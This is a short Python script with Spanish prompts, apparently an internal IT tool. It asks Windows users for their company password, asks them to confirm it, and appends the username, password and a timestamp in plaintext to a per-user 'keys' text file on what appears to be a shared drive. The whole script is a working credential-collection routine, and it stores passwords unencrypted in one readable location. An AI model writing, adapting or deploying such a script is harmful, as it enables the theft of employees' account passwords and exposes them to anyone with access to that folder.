import sys
import time
import getpass
import datetime
import os

# === CONFIGURACIÓN ===
carpeta_destino = r"I:\MigDel"

# Obtener nombre de usuario Windows
usuario = getpass.getuser()

print("=== Ingreso de credenciales ===\n")

try:
    while True:
        print("Ingrese su contraseña (los caracteres no se mostrarán mientras escribe):")
        clave = getpass.getpass("> ").strip()

        if not clave:
            print("\n[ERROR] Debe ingresar su contraseña de usuario de <empresa>.")
            time.sleep(3)
            sys.exit(1)

        confirmar = input("¿Está seguro de que la escribió correctamente? (S/N): ").strip().lower()
        if confirmar == "s":
            break
        elif confirmar == "n":
            print("\nVuelva a ingresar su contraseña.\n")
        else:
            print("\nRespuesta inválida. Por favor escriba S o N.\n")

    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    linea = f"{usuario};{clave};{timestamp}\n"
    archivo = os.path.join(carpeta_destino, f"keys_{usuario}.txt")

    try:
        with open(archivo, "a", encoding="utf-8") as f:
            f.write(linea)
        print("\n[OK] Datos guardados correctamente.")
    except:
        print("\n[ERROR] Ocurrió un problema al guardar los datos.")
        print("Por favor contacte a <ResponsableIT> para informar el error.")

except (KeyboardInterrupt, SystemExit):
    print("\nPrograma terminado por el usuario.")
    sys.exit(0)

input("\nPresione Enter para cerrar...")
